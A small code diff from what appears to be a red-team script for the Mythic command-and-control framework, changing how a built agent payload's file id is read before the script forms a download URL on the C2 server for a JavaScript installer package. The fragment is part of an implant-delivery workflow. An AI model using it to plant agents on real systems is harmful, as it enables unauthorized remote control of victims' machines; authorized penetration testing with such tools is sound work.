@@ -54,7 +54,7 @@ def install_js():
         resp = await mythic.create_payload(p, all_commands=True, wait_for_build=True)
 
         print("[*] Building Installer Package JS Payload")
-        payloadDownloadid = resp.response.file_id.agent_file_id
+        payloadDownloadid = resp.response.file["agent_file_id"]
   
         #Replace template values
         url = "https://" + mythic_server_ip + ":" + mythic_server_port + "/api/v1.4/files/download/" + payloadDownloadid #modify to point to desired location
